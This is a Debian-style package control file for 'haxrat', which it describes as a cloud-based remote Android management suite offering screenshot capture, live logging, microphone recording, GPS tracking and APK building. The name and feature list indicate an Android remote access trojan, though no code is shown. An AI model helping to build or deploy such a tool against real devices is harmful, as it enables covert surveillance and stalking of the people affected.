Package: haxrat
Version: 1.0.1
Architecture: all
Maintainer: Alienkrishn [Anon4You]
Depends: git, npm, apkeditor, apksigner
Section: net
Priority: optional
Homepage: https://github.com/Anon4You/haxRat
Description: Cloud-based remote Android management suite
 HaxRat is a Node.js‑powered tool that provides remote management
 and monitoring of Android devices. It supports features like
 screenshot capture, live logging, microphone recording, GPS
 tracking and APK building.
